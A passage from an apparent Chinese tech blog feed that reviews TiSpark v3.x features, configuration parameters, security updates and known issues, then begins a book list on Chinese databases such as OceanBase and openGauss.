<p>v3.1.0, v3.0.2<br>
We will not provide the mysql-connector-java dependency because of the limit of the GPL license #2457, #2460</p>
</blockquote>
<p>相关内容在官方文档中也有表述：<a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/tispark-overview#%E8%8E%B7%E5%8F%96-mysql-connector-j" >获取 mysql-connector-j <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>！Tips:</p>
<ol>
<li>
<p>在最新版的 TiSpark v3.2.2 中，引用的依赖是 <a class="link"   href="https://github.com/pingcap/tispark/blob/v3.2.2/pom.xml#L87C17" >mysql-connector-java 8.0.29 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，而 MySQL Connector/J 最新版为 <a class="link"   href="https://dev.mysql.com/downloads/connector/j/" >8.0.33 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。实际测试过程中直接使用 8.0.33 也没有问题。</p>
</li>
<li>
<p>MySQL Connector/J 的 Class 名由 <code>com.mysql.jdbc.Driver</code> 改为 <code>com.mysql.cj.jdbc.Driver</code>，如果依旧使用旧名称 Connector 会弹出告警信息，不过基本没影响，毕竟这告警已经存在 8 年了。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Loading class `com.mysql.jdbc.Driver&#x27;. This is deprecated. The new driver class is `com.mysql.cj.jdbc.Driver&#x27;. </span><br><span class="line">The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary.</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>如果没导入 jdbc 会报错：</li>
</ol>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>df=spark.read.<span class="built_in">format</span>(<span class="string">&quot;jdbc&quot;</span>).options(url=url,</span><br><span class="line"><span class="meta">... </span>  driver=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>,</span><br><span class="line"><span class="meta">... </span>  dbtable=<span class="string">&quot;t1&quot;</span></span><br><span class="line"><span class="meta">... </span>  ).load()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">  File <span class="string">&quot;/home/shawnyan/spark-3.3.1-bin-hadoop2/python/lib/py4j-0.10.9.5-src.zip/py4j/protocol.py&quot;</span>, line <span class="number">328</span>, <span class="keyword">in</span> get_return_value</span><br><span class="line">py4j.protocol.Py4JJavaError: An error occurred <span class="keyword">while</span> calling o51.load.</span><br><span class="line">: java.lang.ClassNotFoundException: com.mysql.jdbc.Driver</span><br><span class="line">        at java.net.URLClassLoader.findClass(URLClassLoader.java:<span class="number">382</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<h3 id="TiDB-兼容性">TiDB 兼容性</h3>
<p>在 <a href="https://shawnyan.cn/2022/tidb/tidb-6.0-tispark-guide/#TiSpark-%E7%89%88%E6%9C%AC%E8%AF%B4%E6%98%8E">TiSpark v2.5 开发入门实践及 TiSpark v3.0.0 新功能解读</a> 文中已经提及，从 TiSpark 2.4.0 开始支持 TiDB 5.0，目前 TiDB 版本已发布至 7.1 LTS，下图显示了 TiSpark 对 TiDB 版本的支持情况，数据均来自于 TiSpark Release Notes。</p>
<img  alt="06.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/06-1690214656896.png"
                      referrerpolicy="no-referrer"
                >
<p>从 TiDB 6.0 开始有一项非常特殊的变化，默认启用新字符校验规则，具体在文章 <a href="https://shawnyan.cn/2022/tidb/tidb-6.0-new-collation/">TiDB 6.0 新特性解读 | Collation 规则</a> 中有表述。</p>
<p>TiSpark 从 v3.1 开始兼容新字符校验规则，换言之，如果使用 TiDB 6.0 及以上版本，并启用了新 Collation 规则，建议将 TiSpark 升级到 v3.1 及以上版本。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB<span class="operator">&gt;</span> <span class="keyword">show</span> config <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;new_collations_enabled_on_first_bootstrap&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+-------------------------------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Type <span class="operator">|</span> Instance         <span class="operator">|</span> Name                                      <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+-------------------------------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> tidb <span class="operator">|</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.6</span>:<span class="number">4000</span> <span class="operator">|</span> new_collations_enabled_on_first_bootstrap <span class="operator">|</span> <span class="literal">true</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------+-------------------------------------------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.023</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是，当前 TiSpark 尚不完全支持所有字符校验规则，只支持如下几种：utf8_bin, utf8_general_ci, utf8_unicode_ci, utf8mb4_bin, utf8mb4_general_ci and utf8mb4_unicode_ci。 此外，也不支持 GBK 字符集。</p>
<h3 id="TiSpark-参数变化">TiSpark 参数变化</h3>
<h4 id="1️⃣-新字符集">1️⃣ 新字符集</h4>
<p>TiSpark 新字符集相关参数：<code>spark.tispark.new_collation_enable</code></p>
<p>这在上文已经解释了该参数的作用，不再赘述。这里补充一点，该参数不用刻意配置，TiSpark 会检测所连接的 TiDB 版本，如果是 6.0.0 以上，会设定为 true，否则设置为 false。</p>
<h4 id="2️⃣-健康检查">2️⃣ 健康检查</h4>
<p>TiSpark v3.2.2 新增两个健康检查参数，分别用于检查与 TiKV 和 TiFlash 的 grpc 通信超时情况 (<code>spark.tispark.grpc.health_check_timeout_in_ms</code>, 2000) ，以及控制监测间隔 (<code>spark.tispark.grpc.health_check_period_in_ms</code>, 3000) 。</p>
<h4 id="3️⃣-加载到缓存">3️⃣ 加载到缓存</h4>
<p>与上面两个参数相关联的需求背景是， TiSpark v3.0.3/v3.1.3/v3.2.1， 新增参数 <code>spark.tispark.load_tables</code>，该参数用于控制是否加载表到 Catalog 缓存，默认情况是初始化 catalogCache 时，会加载表到缓存。我们常说 10,000 小时定律，没想到 TiSpark 遇到了反向境况，背景是有用户报告 TiSpark 加载超过 10,000 张表会 hang 住。</p>
<h4 id="4️⃣-TiKV-副本角色">4️⃣ TiKV 副本角色</h4>
<p>TiSpark v3.2 中新增参数 <code>spark.tispark.replica_read</code> 以支持从 TiKV 的不同副本角色（默认为 Leader，还可选择 Follwer, Learner）读取数据，从而降低 Leader Region 的压力，提升数据读取能力。</p>
<p>例如，从 Follower 角色的副本读取数据，只需在配置文件 <code>spark-default.conf</code> 中增加 <code>spark.tispark.replica_read follower</code>。</p>
<p>与此相关还有三个新增参数可以控制 follower read 功能：</p>
<ul>
<li><code>spark.tispark.replica_read.label</code>：只查询 TiKV 上匹配的标签。</li>
<li><code>spark.tispark.replica_read.address_whitelist</code>：只从给定的 TiKV IP 地址进行查询</li>
<li><code>spark.tispark.replica_read.address_blacklist</code>：不从给定的 TiKV IP 地址进行查询</li>
</ul>
<p>官方文档中有简单介绍如何启用该功能：<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/readonly-nodes#32-%E5%9C%A8-tispark-%E4%B8%AD%E4%BD%BF%E7%94%A8-follower-read" >在 TiSpark 中使用 Follower Read <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
关于 Label 的内容，请参考 Placement Rules in SQL 相关文档，<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/schedule-replicas-by-topology-labels" >通过拓扑 label 进行副本调度 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="TiSpark-功能增强">TiSpark 功能增强</h2>
<h3 id="CBO-增强">CBO 增强</h3>
<p>TiSpark v3.0.3 提交了一个 PR (<a class="link"   href="https://github.com/pingcap/tispark/pull/2563" >#2563 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 来加强 CBO 能力，TiSpark 将分析 TiKV 表扫 (<code>TableReader</code>)， TiKV 索引扫 (<code>IndexReader</code>)， TiFlash 表扫 (<code>TableReader</code>)，并选择一个代价最小的路径来读取数据。</p>
<h3 id="Physical-Plan-增强">Physical Plan 增强</h3>
<p>从 TiSpark v3.1.0 版本开始，物理执行计划 (<a class="link"   href="https://github.com/pingcap/tispark/blob/v3.2.2/docs/design/2022-06-15-phyical_plan_explain.md" >Physical Plan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 也得到了改进 (<a class="link"   href="https://github.com/pingcap/tispark/pull/2439" >#2439 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) ，表示更加清晰，命名也延续 TiDB 一致性。</p>
<ul>
<li>TiKV 表扫 (<code>TableReader</code>)</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>spark.sql(<span class="string">&quot;select * from t1&quot;</span>).explain()</span><br><span class="line">== Physical Plan ==</span><br><span class="line">*(<span class="number">1</span>) ColumnarToRow</span><br><span class="line">+- TiKV CoprocessorRDD&#123;[table: t1] TableReader, Columns: <span class="built_in">id</span>@LONG: &#123; TableRangeScan: &#123; RangeFilter: [], Range: [([t\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>^_r\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>], [t\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>^_s\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>])] &#125; &#125;, startTs: <span class="number">442981720704417794</span>&#125; EstimatedCount:<span class="number">5</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>TiKV 索引扫 (<code>IndexReader</code>)</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>spark.sql(<span class="string">&quot;select * from t1 where id &gt; 2&quot;</span>).explain()</span><br><span class="line">== Physical Plan ==</span><br><span class="line">*(<span class="number">1</span>) ColumnarToRow</span><br><span class="line">+- TiKV CoprocessorRDD&#123;[table: t1] IndexReader, Columns: <span class="built_in">id</span>@LONG: &#123; IndexRangeScan(Index:t1_idx_id(<span class="built_in">id</span>)): &#123; RangeFilter: [[<span class="built_in">id</span>@LONG GREATER_THAN <span class="number">2</span>]], Range: [([t\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>^_i\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\001\003\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\003], [t\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>^_i\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\001\<span class="number">372</span>])] &#125; &#125;, startTs: <span class="number">442981723456667650</span>&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>TiFlash 表扫 (<code>TableReader</code>)</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>spark.sql(<span class="string">&quot;select count(*) from t1&quot;</span>).explain()</span><br><span class="line">== Physical Plan ==</span><br><span class="line">AdaptiveSparkPlan isFinalPlan=false</span><br><span class="line">+- HashAggregate(keys=[], functions=[specialsum(count(<span class="number">1</span>)<span class="comment">#14L, LongType, 0)])</span></span><br><span class="line">   +- Exchange SinglePartition, ENSURE_REQUIREMENTS, [plan_id=<span class="number">25</span>]</span><br><span class="line">      +- HashAggregate(keys=[], functions=[partial_specialsum(count(<span class="number">1</span>)<span class="comment">#14L, LongType, 0)])</span></span><br><span class="line">         +- TiFlash CoprocessorRDD&#123;[table: t1] TableReader, Columns: <span class="built_in">id</span>@LONG: &#123; TableRangeSca</span><br><span class="line">n: &#123; RangeFilter: [], Range: [([t\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>^_r\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>], [t\<span class="number">200</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>^_s\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>\<span class="number">000</span>])] &#125;, Aggregates: Count(<span class="number">1</span>) &#125;, startTs: <span class="number">442981759370657793</span>&#125; EstimatedCount:<span class="number">5</span></span><br></pre></td></tr></table></figure></div>
<h3 id="TiFlash-轮转">TiFlash 轮转</h3>
<p>从 TiSpark v3.0.3/v3.1.2/v3.2.0 开始，支持在读取 TiFlash 时采用 Round-Robin 策略的负载均衡 (<a class="link"   href="https://github.com/tikv/client-java/pull/662" >client-java #662 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) ，以此来提升 TiFlash 的利用率，如果有 2 个 TiFlash，不再总将所有负载发送到其中某个 TiFlash 上。</p>
<h3 id="TiSpark-应用开发">TiSpark 应用开发</h3>
<h4 id="DELETE">DELETE</h4>
<p>从 TiSpark v3.0.0 开始，支持 <code>DELETE</code> 操作，这部分内容也已在 <a href="https://shawnyan.cn/2022/tidb/tidb-6.0-tispark-guide/#TiSpark-%E7%89%88%E6%9C%AC%E8%AF%B4%E6%98%8E">TiSpark v2.5 开发入门实践及 TiSpark v3.0.0 新功能解读</a> 文中提及，不再多言。</p>
<h4 id="INSERT">INSERT</h4>
<p>之前的版本(TiSpark v2.4)中，TiSpark 只能调用 datasource api 来写数据。现在，从 TiSpark v3.1.0 开始支持 <code>INSERT</code> SQL 语句，并在 TiSpark v3.2.0 中写入功能得到增强：</p>
<ol>
<li>支持写入带有 <code>AUTO_RANDOM</code> 为主键的表。(<a class="link"   href="https://github.com/pingcap/tispark/pull/2545" >#2545 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ol>
<img  alt="07.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/07-1690214668408.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="08.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/08-1690214673674.png"
                      referrerpolicy="no-referrer"
                >
<ol start="2">
<li>支持写入带有新字符集的分区表。(<a class="link"   href="https://github.com/pingcap/tispark/pull/2565" >#2565 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ol>
<p>更多内容可参阅 <a class="link"   href="https://github.com/pingcap/tispark/blob/master/docs/features/datasource_api_userguide.md" >TiDB Data Source API User Guide <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="TiSpark-安全">TiSpark 安全</h2>
<h3 id="Telemetry">Telemetry</h3>
<p>TiSpark 的<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/telemetry" >遥测 (Telemetry) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 功能是从 v3.0.0 开始支持的，由参数 <code>spark.tispark.telemetry.enable</code> 进行开关控制。</p>
<blockquote>
<p>自 2023 年 2 月 20 日起，新发布的 TiDB 和 TiDB Dashboard 版本（含 v6.6.0），默认关闭遥测功能，即默认不再收集使用情况信息分享给 PingCAP。</p>
</blockquote>
<p>从 TiSpark v3.0.3/v3.1.3/v3.2.1/v3.3.0 起，默认关闭遥测功能，即，默认 <code>spark.tispark.telemetry.enable = false</code>。(<a class="link"   href="https://github.com/pingcap/tispark/pull/2621" >#2621 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
<h3 id="log4j2">log4j2</h3>
<p>很多人到现在或许还对 21 年 log4j2 的“炒鸡”严重漏洞 (<a class="link"   href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" >CVE-2021-44228 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) “念念不忘”。主要考虑到安全因素 Spark 对 log4j2 进行版本升级。<br>
Spark v3.3.0 中的 log4j2 版本升至 2.17.2 (<a class="link"   href="https://issues.apache.org/jira/browse/SPARK-38544" >SPARK-38544 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 。<br>
Spark v3.4.0 中的 log4j2 版本升至 2.19.0 (<a class="link"   href="https://issues.apache.org/jira/browse/SPARK-40484" >SPARK-40484 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 。<br>
Spark v3.5.0 中的 log4j2 版本升至 2.20.0 (<a class="link"   href="https://issues.apache.org/jira/browse/SPARK-42536" >SPARK-42536 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 。</p>
<h2 id="遗留问题">遗留问题</h2>
<ol>
<li>
<p>pyspark 可以选择直接从 TiFlash 读取数据，在文档 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/use-tispark-to-read-tiflash" >使用 TiSpark 读取 TiFlash <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中有所介绍。但是，无法动态调整 TiSpark 选择哪个 storage (TiKV or TiFlash)，可以修改 <code>conf.set(&quot;spark.tispark.isolation_read_engines&quot;, &quot;tiflash&quot;)</code>，但不生效。只能修改配置文件 <code>spark-defaults.conf</code>，比如限定只从 TiFlash 读取数据 <code>spark.tispark.isolation_read_engines tiflash</code>，然后重启 worker 才能生效。(<a class="link"   href="https://asktug.com/t/topic/1009913" >1009913 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
</li>
<li>
<p>每次使用 pyspark/spark-shell 都会遇到 <code>WARN TiConfiguration: Unable to find tikv.properties</code>，虽无伤大雅，嗯~ (<a class="link"   href="https://asktug.com/t/topic/1009954" >1009954 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
</li>
<li>
<p>无法在 pyspark 中使用 <code>explain analyze</code> 语法，所以无法直接看到发出的语句在 TiKV 上消耗的 RU (<a href="https://shawnyan.cn/2023/tidb/tidb-7.1-resource-control/">资源管控</a>相关概念) 是多少。不过，Spark 中的 explain 和 TiDB 中的 explain 本就不一样。(<a class="link"   href="https://asktug.com/t/topic/1009929" >1009929 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
</li>
<li>
<p>在测试新参数 <code>spark.tispark.replica_read</code> 时发现该参数会影响写操作。(<a class="link"   href="https://asktug.com/t/topic/1010197" >1010197 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
</li>
</ol>
<h2 id="总结">总结</h2>
<p>本文归纳总结了 TiSpark v3.0.0 以来的大部分新特性，相信对 TiSpark 爱好者或开发者会有所帮助。对 TiSpark 感兴趣、有需求的伙伴们，建议直接使用最新版 TiSpark，如果遇到 TiDB 升级 case，也建议对 TiSpark 进行版本升级。</p>
<p>在使用 TiSpark 过程中如果遇到任何问题，推荐先来 <a class="link"   href="https://search.asktug.com/" >AskTUG Search <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一下，没有匹配的帖子可以提一个新的，相信很快会收到回应，AskTUG 社区可是拥有 <strong>30,000+</strong> 活跃用户的哦，是国产数据库厂商自建论坛里顶尖的存在。</p>
<p>随着 TiSpark 版本更新，新特性的引入，Bug 的修复，我们期待看到更高效、更灵活和更可靠的数据处理体验。</p>
<p>Ps.<br>
本文开始编辑于 7/5，测试环境也搭建于当日，这期间 <a href="https://shawnyan.cn/2023/mysql/mysql-8.1.0-release/">MySQL 8.1 发布了</a>，文中的版本信息以 7/5 为基准。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 7.x</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>tidb</tag>
        <tag>tispark</tag>
        <tag>spark</tag>
        <tag>tidb 7.x</tag>
      </tags>
  </entry>
  <entry>
    <title>严选书单 | 国产数据库的技术书籍（最新版）</title>
    <url>/2023/other/database-book-list/</url>
    <content><![CDATA[<p><strong>书籍是人类进步的阶梯。国产数据库的技术书籍是数据工作者快速熟悉某款国产数据库的“加速道具”。</strong></p>
<p><a class="link"   href="https://www.modb.pro/dbRank" >国产数据库排行榜 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 已经上榜 282 个数据库（截至 2023/07），有不少数据库厂商已经出版了相关书籍，本文收罗了国产数据库的书籍，以供参考。</p>
<p>以下按 2023 年 7 月中国数据库排行榜 🆙 做为第一排序要素，各数据库相关书籍按出版时间 ⏲️ 倒序做为第二排序要素。(<code>ORDER BY dbrank, publication_time DESC</code>)</p>
<img  alt="b01.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-f636f093-655b-4d9c-b608-c6594bc199c5.JPG"
                      width=450px referrerpolicy="no-referrer"
                >
<p>图 – 我的私藏图书</p>
<h2 id="1️⃣-OceanBase">1️⃣ OceanBase</h2>
<p>OceanBase 本月位列榜首，本月得分 638.36 分。官方文档：<a class="link"   href="https://www.oceanbase.com/docs/oceanbase-database" >OceanBase 数据库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="🇦-OceanBase数据库源码解析">🇦 OceanBase数据库源码解析</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="http://www.cmpedu.com/books/book/5606761.htm" >OceanBase数据库源码解析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作者： 彭煜玮 杨传辉 杨志丰<br>
ISBN： 9787111723387<br>
出版时间： 2023-07-05<br>
出版社： 机械工业出版社</p>
<ul>
<li>内容介绍</li>
</ul>
<p>OceanBase作为当今先进的分布式关系型数据库之一，在开源之后受到了业界的广泛关注。为了帮助数据库内核研发人员、科研工作者、数据库技术爱好者理解OceanBase内核，本书从OceanBase开源版的源代码出发，介绍其实现机制和技术细节。<br>
本书的主要内容包括：OceanBase概述、OceanBase的架构、OBServer、存储引擎、SQL引擎、事务引擎、高可用、多租户、安全管理等。本书尽可能沿着SQL语句的执行路径对上述主题进行详细介绍，以使读者对OceanBase的内部运作机理能有全面和深入的认识。</p>
<img  alt="b02.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-395c7767-150b-47f0-b30d-e7bd79d256ed.JPG"
                      width=450px referrerpolicy="no-referrer"
                >
<h3 id="🇧-大规模分布式存储系统：原理解析与架构实战">🇧 大规模分布式存储系统：原理解析与架构实战</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="https://item.jd.com/11310547.html" >大规模分布式存储系统：原理解析与架构实战 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
作者： 杨传辉<br>
ISBN： 9787111430520<br>
出版时间： 2013-09-01<br>
出版社： 机械工业出版社</p>
<ul>
<li>内容介绍</li>
</ul>
<p>《大规模分布式存储系统：原理解析与架构实战》是分布式系统领域的经典著作，由阿里巴巴高级技术专家“阿里日照”（OceanBase核心开发人员）撰写，阳振坤、章文嵩、杨卫华、汪源、余锋（褚霸）、赖春波等来自阿里、新浪、网易和百度的专业技术专家联袂推荐。理论方面，不仅讲解了大规模分布式存储系统的核心技术和基本原理，而且对谷歌、微软和阿里巴巴等国际型大互联网公司的大规模分布式存储系统进行了分析；实战方面，首先通过对阿里巴巴的分布式数据库OceanBase的实现细节的深入剖析完整地展示了大规模分布式存储系统的架构与设计过程，然后讲解了大规模分布式存储技术在云计算和大数据领域的实践与应用。</p>
<img  alt="b03.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-93d4ec2b-b0c9-4e23-9a64-0b27a219ff37.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h3 id="🇨-【最全】OceanBase-社区版入门到实战教程">🇨 【最全】OceanBase 社区版入门到实战教程</h3>
<ul>
<li>图书信息</li>
</ul>
<p>这是本电子书，并非正规出版物，但曾经批量印刷过，故列与此。本书成书于 2022 年初，内容多以 OB 3.0 居多，共 659 页，是本大部头，书中有很多实践内容，建议翻阅电子书，可以方便的复制命令或代码。</p>
<p>下载链接：<a class="link"   href="https://www.modb.pro/doc/58980" >【最全】OceanBase 社区版入门到实战教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书共八章，从 OceanBase 数据库概述开始，到安装部署，到使用，到迁移再到运维、测试、性能诊断，最后是 OceanBase 生态工具的使用，带你学面掌握 OceanBase 实战使用技能！本教程总结了 OceanBase 社区版运维开发常见的场景、问题和实践经验，内含具体操作示例、原理解释等。</p>
<img  alt="b04.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-d899ca55-265b-46b3-9dfb-a95581147d98.png"
                      width=450px referrerpolicy="no-referrer"
                >
<h2 id="2️⃣-openGauss">2️⃣ openGauss</h2>
<p>openGauss 本月位列榜第二，本月得分 627.08 分。官方文档：<a class="link"   href="https://docs.opengauss.org/zh" >openGauss 企业版 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="🇦-openGauss数据库实战指南">🇦 openGauss数据库实战指南</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="http://www.tup.tsinghua.edu.cn/bookscenter/book_09179501.html" >openGauss数据库实战指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
李国良，冯建华 著<br>
出版社： 清华大学出版社<br>
ISBN： 9787302589891<br>
出版时间：2021-10-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书结合openGauss数据库原理，讲述openGauss数据库实战相关内容，并设计多种实验帮助用户理解并使用openGauss数据库。本书首先介绍数据库的基本概念、安装部署、开发调试，并设计实验帮助用户熟悉这一系列操作。接着介绍数据库设计、查询优化、维护、数据库备份与恢复及导入与导出、存储引擎、事务控制和数据库安全等。本书理论与实践并重，读者通过阅读本书并进行实践，可以较好地掌握openGauss数据库。本书面向的读者主要是高校学生及使用openGauss数据库的工程师。</p>
<img  alt="b05.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-056a9187-6b81-4232-b19a-cffa62119430.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h3 id="🇧-openGauss数据库源码解析">🇧 openGauss数据库源码解析</h3>
<ul>
<li>图书信息</li>
</ul>
<p><a class="link"   href="http://www.tup.tsinghua.edu.cn/booksCenter/book_09323001.html" >openGauss数据库源码解析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
李国良，张树杰 著<br>
出版社： 清华大学出版社<br>
ISBN：9787302586173<br>
出版时间：2021-09-01</p>
<ul>
<li>内容介绍</li>
</ul>
<p>本书是针对openGauss开源数据库的源码进行分模块解析的书籍。全书共分为10章。第1章对openGauss进行简介。第2章介绍了内核开发所需的入门知识,包括openGauss的安装、基本使用、开发、编译、参与社区开源项目等。第3~10章针对openGauss不同的功能模块分别进行源码介绍。第3章针对系统表、多线程架构、内存管理等作用于整个数据库系统的公共组件从定义、原理、流程等方面进行源码介绍; 第4章介绍openGauss满足OLTP、OLAP不同业务场景的存储引擎实现及对应的源码; 第5章介绍保证数据库ACID属性的事务机制的原理和源码; 第6章介绍SQL 引擎的SQL解析和查询优化代码主流程; 第7章介绍openGauss执行器的整体架构和各类执行算子的源码; 第8章介绍openGauss在人工智能与数据库结合领域探索的源码; 第9章从系统整体角度出发,针对基础和高阶的安全能力进行全面介绍和源码解读; 第10章介绍openGauss的备份恢复机制的源码,包括全量备份、增量备份所涉及的工具、交互流程和主要文件等。</p>
<img  alt="b06.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230721-0c6feb4e-32f9-463e-9a97-7517994f6bd9.jpg"
                      width=450px referrerpolicy="no-referrer"
                >
<h3 id="🇨-华为openGauss开源数据库实战">🇨 华为openGauss开源数据库实战</h3>
<ul>
<li>图书信息</li>
</ul>
